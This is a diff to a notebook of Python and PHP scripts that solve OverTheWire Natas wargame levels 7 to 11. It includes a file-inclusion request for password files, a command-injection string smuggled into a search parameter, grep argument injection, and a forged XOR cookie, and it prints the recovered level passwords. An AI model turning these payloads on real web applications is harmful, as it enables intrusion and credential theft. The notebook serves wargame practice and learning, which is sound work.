@@ -11,9 +11,13 @@ This script contains my efforts to script the solutions to the natas challenges 
 * Setup
 #+begin_src python :results silent
 from requests.auth import HTTPBasicAuth
+import base64
+import binascii
+import html
 import json
 import re
 import requests
+from loguru import logger
 
 host = "natas.labs.overthewire.org"
 credentials = {"natas0": "natas0"}
@@ -219,3 +223,176 @@ credentials['natas7']
 
 #+RESULTS:
 : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+* Natas7 => Natas8
+
+#+begin_src python :results none
+def natas7():
+    username = 'natas7'
+    print(F"Pwning {username}")
+    url = get_url(username) + "/index.php?page=/etc/natas_webpass/natas8"
+
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+    passwd = re.findall(r'<br>\n(\w+)', r.text, re.MULTILINE)[0]
+
+    credentials["natas8"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas7()
+credentials['natas8']
+#+end_src
+
+#+RESULTS:
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+* Natas8 => Natas9
+
+#+begin_src python :results none
+def natas8():
+    username = 'natas8'
+    print(F"Pwning {username}")
+    url = get_url(username)
+    source = url + "/index-source.html"
+
+    r = requests.get(source, auth=HTTPBasicAuth(username, credentials[username]))
+    escaped = html.unescape(r.text)
+    encoded = re.findall(r'encodedSec.*?\"(.*?)\"', escaped)[0]
+    b64Reversed = binascii.unhexlify(encoded).decode()
+    b64 = b64Reversed[::-1]
+    secret = base64.b64decode(b64).decode()
+
+    data = {'secret': secret, 'submit': 'Submit+Query'}
+    r = requests.post(url, auth=HTTPBasicAuth(username, credentials[username]), data=data)
+
+    passwd = re.findall(r'natas9 is (\w+)', r.text)[0]
+
+    credentials["natas9"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas8()
+credentials['natas9']
+#+end_src
+
+#+RESULTS:
+: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+* Natas9 => Natas10
+
+Escape the =grep= command by putting a semicolon, run the command to read the password, and then put =ls= at the end to prevent =cat= from reading the entire dictionary
+
+#+begin_src python :results none
+def natas9():
+    username = 'natas9'
+    print(F"Pwning {username}")
+
+    query = "t; cat /etc/natas_webpass/natas10; ls"
+    url = get_url(username) + F"/?needle={query}&submit=Search"
+
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r'<pre>\n(\w+)', r.text, re.MULTILINE)[0]
+
+    credentials["natas10"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas9()
+credentials['natas10']
+#+end_src
+
+#+RESULTS:
+: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+* Natas10 => Natas11
+
+Add the -E flag to grep which allows use to use the {} syntax.
+Using this, we can say search for anything '.' with a length of 32 characters and then pass in the password file as well.
+This will prevent all of the dictionary results from being returned with the password.
+
+#+begin_src python :results none
+def natas10():
+    username = 'natas10'
+    print(F"Pwning {username}")
+
+    query = '-E .{32} /etc/natas_webpass/natas11'
+    url = get_url(username) + F"/?needle={query}&submit=Search"
+
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r':(\w+)\n', r.text, re.MULTILINE)[0]
+
+    credentials["natas11"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas10()
+credentials['natas11']
+#+end_src
+
+#+RESULTS:
+: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+* Natas11 => Natas12
+
+Since you can reverse xor if you know what the input is, we can get the key by xor'ing the default cookie with the default data.
+The cookie is just =qw8J= repeated over and over.
+
+#+begin_src php
+function xor_encrypt($in, $key)
+{
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for ($i = 0; $i < strlen($text); $i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
+$key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+
+echo "Key is: " . xor_encrypt(base64_decode($cookie), $key) . "\n";
+
+$exploit_cookie = json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"));
+$key = "qw8J";
+
+echo "New cookie is: " . base64_encode(xor_encrypt($exploit_cookie, $key));
+#+end_src
+
+#+RESULTS:
+: Key is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+: New cookie is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+#+begin_src python :results none
+def natas11():
+    username = 'natas11'
+    print(F"Pwning {username}")
+    url = get_url(username)
+
+    malicious_cookie = {'data': "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}
+
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]),cookies=malicious_cookie)
+
+    passwd = re.findall(r'natas12 is (\w+)', r.text)[0]
+
+    credentials["natas12"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas11()
+credentials['natas12']
+#+end_src
+
+#+RESULTS:
+: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
